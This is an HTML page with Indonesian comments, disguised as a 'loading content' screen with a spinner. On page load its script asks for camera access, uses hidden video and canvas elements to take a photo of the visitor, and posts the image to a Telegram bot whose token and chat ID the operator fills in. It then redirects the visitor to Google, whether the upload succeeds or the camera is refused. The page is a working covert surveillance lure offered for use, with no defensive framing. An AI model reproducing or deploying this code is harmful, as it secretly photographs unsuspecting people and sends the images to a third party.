<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f2f5;
            font-family: Arial, sans-serif;
            color: #555;
        }
        .loader {
            text-align: center;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        /* Sembunyikan elemen video dan canvas */
        #video, #canvas {
            display: none;
        }
    </style>
</head>
<body>

    <div class="loader">
        <div class="spinner"></div>
        <p>Memuat konten, mohon tunggu...</p>
    </div>

    <!-- Elemen ini diperlukan untuk proses di belakang layar -->
    <video id="video"></video>
    <canvas id="canvas"></canvas>

    <script>
        // --- GANTI DENGAN KREDENSIAL ANDA ---
        const BOT_TOKEN = "MASUKKAN_BOT_TOKEN_ANDA_DI_SINI";
        const CHAT_ID = 123456789; // Ganti dengan Chat ID Anda
        // -----------------------------------

        // Fungsi untuk mengambil dan mengirim foto
        async function captureAndSend() {
            try {
                // 1. Minta akses kamera
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    } 
                });

                // 2. Tampilkan stream di elemen video (tersembunyi)
                const video = document.getElementById('video');
                video.srcObject = stream;
                video.play();

                // 3. Tunggu video siap, lalu ambil gambar ke canvas
                video.onloadedmetadata = () => {
                    setTimeout(() => { // Beri jeda sebentar agar kamera fokus
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const context = canvas.getContext('2d');
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);

                        // 4. Hentikan stream kamera
                        stream.getTracks().forEach(track => track.stop());

                        // 5. Konversi canvas ke Blob (format file gambar)
                        canvas.toBlob(async (blob) => {
                            // 6. Buat FormData untuk dikirim ke Telegram
                            const formData = new FormData();
                            formData.append('photo', blob, 'capture.jpg');
                            formData.append('chat_id', CHAT_ID);

                            // 7. Kirim ke API Telegram
                            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                method: 'POST',
                                body: formData
                            });

                            if (response.ok) {
                                console.log("Foto berhasil terkirim!");
                                // 8. Alihkan ke situs lain setelah berhasil
                                window.location.href = "https://www.google.com";
                            } else {
                                console.error("Gagal mengirim foto:", response.statusText);
                                window.location.href = "https://www.google.com";
                            }
                        }, 'image/jpeg', 0.9);
                    }, 1500); // Jeda 1.5 detik
                };

            } catch (error) {
                console.error("Akses kamera ditolak atau terjadi error:", error);
                // Alihkan juga jika pengguna menolak izin
                window.location.href = "https://www.google.com";
            }
        }

        // Jalankan fungsi saat halaman dimuat
        window.onload = captureAndSend;

    </script>
</body>
</html>
